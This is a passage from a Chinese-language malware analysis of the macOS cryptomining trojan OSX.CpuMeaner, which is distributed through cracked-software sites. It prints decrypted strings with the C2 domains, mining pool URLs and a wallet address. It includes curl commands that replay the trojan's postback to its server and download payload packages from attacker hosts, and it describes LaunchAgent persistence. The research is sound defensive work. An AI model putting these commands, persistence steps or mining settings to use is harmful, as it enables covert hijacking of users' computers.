    3d3a3c2f3a3b23653a2d3e74616136233c603e212122602327202b3c292f3a2b602d2123747a7b7b787e
    232f3c3a27202439262b2b3a0e232f2722602d2123
    $ ../decrypt_strings.py mosx1/xmemapp mosx{2,3}/cpucooler
    Decrypted strings for: mosx1/xmemapp
    ioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(""", "", $4);print $4}'
    jumpcash.xyz
    mosx1
    stratum+tcp://xmr.pool.minergate.com:45560
    PI:EMAIL
    Decrypted strings for: mosx2/cpucooler
    ioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(""", "", $4);print $4}'
    jumpcash.xyz
    mosx2
    stratum+tcp://xmr.pool.minergate.com:45560
    PI:EMAIL
    Decrypted strings for: mosx3/cpucooler
    ioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(""", "", $4);print $4}'
    jumpcash.xyz
    mosx3
    stratum+tcp://xmr.pool.minergate.com:45560
    PI:EMAIL
这些程序使用2个线程（即200%的CPU使用率）连接到[MinerGate的XMR矿池](https://minergate.com/pool-stats/xmr)，挖矿所使用的账号为`[PI:EMAIL](mailto:PI:EMAIL)`（mosx1以及mosx2）以及
`[PI:EMAIL](mailto:PI:EMAIL)`（mosx3）。
当使用真实的参数来运行时（如通过`postinstall`脚本来运行时），`main()`函数会在第一个参数（软件包名称）中查找`-`及`.`符号，找到这些符号后，就会将子字符串作为参数来调用`Postback::sendPostback()`函数。
`Postback::sendPostback()` 会将安装数据发送给经过解码的某个域名，请求网址中带有通过
`Utils::getNumber()`生成的参数。
    $ curl -A MNR -w "%{http_code}" http://jumpcash.xyz/pb.php -G -d t=mosx3 -d mid=2162179746 -d i=2305343-823868397374412531
    200
`Utils::getNumber()`函数会通过 `Utils::exec()`来运行解码后的
`ioreg`命令。得到命令输出结果后，使用Jenkins的[一次性哈希算法](https://en.wikipedia.org/wiki/Jenkins_hash_function#one-at-a-time)生成该结果的哈希值（十进制形式），该哈希值作为Web请求参数加以使用。
有趣的是，程序中并没有使用`Utils::str_replace()`函数以及`Utils::jenkins_one_at_a_time_hash()`函数（这些代码属于僵尸代码）。
##
## 五、MNR2变种分析
`jumpcash.xyz`域名取消服务后，又涌现出一大批新的变种，这些变种托管于其他网站，如[网站1](https://crackprowin.com/sketch-crack-mac/)及[网站2](http://softwarestrack.com/sketch-42-crack-keygen/)。
    $ for tag in mosx{2,3,np} ; do curl -s -o $tag.pkg http://storekit.xyz/api/v1/download.php -G -d e=pkg -d tag=$tag ; done
    $ shasum -a 256 *.pkg
    b6cbc89d0b5a8938c74c1f601a2b7a88b4a3391bf808d2c028885003a16d9b5a  mosx2.pkg
    f1da940d6f417ef0001595ed816889ecdcacb41a3d6c921b6e039dc30e35ab8a  mosx3.pkg
    6e0ec2d6754138b5971f417176136a7becfd75359919a8a5a3b4233aeaade9b3  mosxnp.pkg
这些软件包使用的是另一个开发者身份（该身份很快就被撤销掉）：
    $ ls mosx*.pkg | xargs -L 1 pkgutil --check-signature | awk '/Developer ID Installer/'
        1. Developer ID Installer: Adam Kortney (9ADZ437492)
        1. Developer ID Installer: Adam Kortney (9ADZ437492)
        1. Developer ID Installer: Adam Kortney (9ADZ437492)
    $ ls mosx*.pkg | xargs -L 1 spctl --assess -v --type install
    mosx2.pkg: accepted
    source=Developer ID
    mosx3.pkg: accepted
    source=Developer ID
    mosxnp.pkg: accepted
    source=Developer ID
同样，Apple于2017年11月22日吊销了该证书：
这些软件包安装的可执行文件使用了新的名称以及路径：
    $ for pkg in mosx*.pkg ; do echo $pkg: $(pkgutil --payload-files $pkg | egrep -v -e ^.$) ; done
    mosx2.pkg: ./mxcpu
    mosx3.pkg: ./mxzcpu
    mosxnp.pkg: ./moszcpu
    $ for tag in mosx{2,3,np} ; do pkgutil --expand $tag.pkg $tag && tar xf $tag/Payload -C $tag ; done
    $ shasum -a 256 mosx*/m*cpu
    91b929d2470e3507b5faf5f12adb35046d96777e8b55b28b8e859a30924168b2  mosx2/mxcpu
    b636b2cc15925e68c200449d5d78a9e169af379e4e3b007075ded00d777ffdc7  mosx3/mxzcpu
    9a8b16f0a44cd63bf525142519b23481d4dcfd84d2dae02a0b0b9cb5caf1c147  mosxnp/moszcpu
    $ for tag in mosx{2,3,np}; do echo $tag: $(xmllint --xpath "string(//pkg-info/@install-location)" $tag/PackageInfo) ; done
    mosx2: /Library/Application Support/mxcpu
    mosx3: /Library/Application Support/mxzcpu
    mosxnp: /Library/Application Support/moszcpu
新软件包使用了一个`preinstall`脚本，如果当前主机已经感染老的变种时，该脚本会生成一个错误代码，退出执行流程。
`postinstall`脚本也有所不同，新版的工作流程如下：
1、将 _launchd.plist_ 文件写入`/Library/LaunchAgents`目录中，以达成本地持久化目的。
2、如果当前主机已被木马感染，则退出执行。
3、将软件包名写入`/Library/Application Support/mosxnp/info`文件中。
4、加载并启动启动代理（Launch Agent）。
5、等待5秒钟，检查程序是否已经运行。
6、如果尚未运行，后台等待30秒，再次以软件包名为参数执行程序。
7、将安装状态发送给远程服务器。
新版程序基于[2.4.2](https://github.com/xmrig/xmrig/tree/v2.4.2)版的XMRig来开发。其中使用的自定义函数与之前版本类似。`main()`函数现在会从`/Library/Application
Support/mosxnp/info`文件中读取软件包名。
新版程序的目标操作系统为macOS Sierra或者更高版本（10.12+），在低版本系统上运行时会崩溃。
    $ uname -v
    Darwin Kernel Version 15.6.0: Mon Aug 29 20:21:34 PDT 2016; root:xnu-3248.60.11~1/RELEASE_X86_64
    $ ./mxzcpu 
    dyld: lazy symbol binding failed: Symbol not found: _clock_gettime
      Referenced from: /Library/Application Support/mxzcpu/./mxzcpu (which was built for Mac OS X 10.12)
      Expected in: /usr/lib/libSystem.B.dylib
    dyld: Symbol not found: _clock_gettime
      Referenced from: /Library/Application Support/mxzcpu/./mxzcpu (which was built for Mac OS X 10.12)
      Expected in: /usr/lib/libSystem.B.dylib
    Trace/BPT trap: 5
这么做也能理解，因为macOS
Sierra系统需要搭配启用[SSE4](https://en.wikipedia.org/wiki/SSE4)功能的处理器，采用这种指令集时，程序的挖矿速度会更快。
解密后的字符串如下所示：
    $ ../decrypt_strings.py mosx*/m*cpu
    Decrypted strings for: mosx2/mxcpu
    storekit.xyz
    mosx2
    ioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(""", "", $4);print $4}'
    /Library/Application Support/mxcpu/info
    stratum+tcp://xmr.pool.minergate.com:45560
    PI:EMAIL
    Decrypted strings for: mosx3/mxzcpu
    storekit.xyz
    mosx3
    ioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(""", "", $4);print $4}'
    /Library/Application Support/mxzcpu/info
    stratum+tcp://xmr.pool.minergate.com:45560
    PI:EMAIL
    Decrypted strings for: mosxnp/moszcpu
    storekit.xyz
    mosxnp
    ioreg -rd1 -w0 -c AppleAHCIDiskDriver | awk '/Serial Number/{gsub(""", "", $4);print $4}'
    /Library/Application Support/moszcpu/info
    stratum+tcp://xmr-eu1.nanopool.org:14444
    49dP6YfhFHmLWb16jESv8V977cYzbx8zCXz6A7gUh1sn65jQ1eQgUpG9qCs2mfNhVW9Jm86RQpDGTHxokFnutubU6HQCeuN.34c5cb2b877d296b3fcfd9c6fb9a5da0c42b044e7fd52372ae5b6cd9bbe6c5c8.
标记为 _mosxnp_ 的变种会连接到[Nanopool XMR矿池](https://xmr.nanopool.org/)来挖矿。
新变种通过`Postback::sendPostback()`函数将安装数据发送至`storekit.xyz`主机上的`/api/v1/pb.php`页面，使用的User-Agent为`MNR2`。
##
## 六、VirusTotal上的样本
2017年中旬，有人将标记为[
_mosx3_](https://www.virustotal.com/file/f9ccfaf965f9b06f3e06b1112e30cc2be97fca76db001f901b4ab0cc28cd44d4/analysis/1510909946/)以及[
_mosxnp_](https://www.virustotal.com/file/fa5ab22307e9539e955a49abf225263fadc7b3f129696c7bc665353bf4650e60/analysis/1510871215/)的软件包上传到VirusTotal上进行检测。
这些软件包中包含的可执行程序（`cpulite`及`mosxnp`）都是MNR2变种，但所使用的`postinstall`脚本略有不同。
程序并没有[静态链接](https://github.com/xmrig/xmrig/wiki/OS-X-Build)XMRig的依赖项（[libuv](http://libuv.org/)以及[libmicrohttpd](https://www.gnu.org/software/libmicrohttpd/)），只导入了所需的符号。由于目标主机上经常缺乏程序所需的动态链接库（[Homebrew](https://brew.sh/)路径），因此这些程序会在启动时崩溃：
    $ otool -L mosxnp
    mosxnp:
        /usr/local/opt/libuv/lib/libuv.1.dylib (compatibility version 2.0.0, current version 2.0.0)
        /usr/local/opt/libmicrohttpd/lib/libmicrohttpd.12.dylib (compatibility version 56.0.0, current version 56.0.0)
        /usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 307.4.0)
        /usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1238.0.0)
    $ ./mosxnp
    dyld: Library not loaded: /usr/local/opt/libuv/lib/libuv.1.dylib
      Referenced from: /Library/Application Support/mosxnp/./mosxnp
      Reason: image not found
    Abort trap: 6
##
## 七、总结
这款OSX.CpuMeaner木马是新型挖矿攻击大军中的一员，现在新型挖矿攻击的规模日益膨胀，我们可以在Android、PC、Linux服务器上看到挖矿攻击活动的身影，甚至Chrome浏览器上也存在CoinHive这种挖矿脚本。事实上，攻击者一直在寻找通过恶意软件感染来谋取利益的方式，虽然挖矿恶意软件并不属于传统的攻击方式（如窃取密码及其他敏感信息、远程控制设备等），但这种攻击方式回报丰厚，只需使用CPU以及少量网络通信就能满足攻击要求。
我们无法百分百肯定这类攻击活动会一直处于活跃状态，但只要整个市场持续膨胀，人们发现投资类似门罗币（Monero）、达世币（DASH）之类的加密货币能获得极高的回报率（ROI），那么这类攻击事件也会持续涌现，源远流长。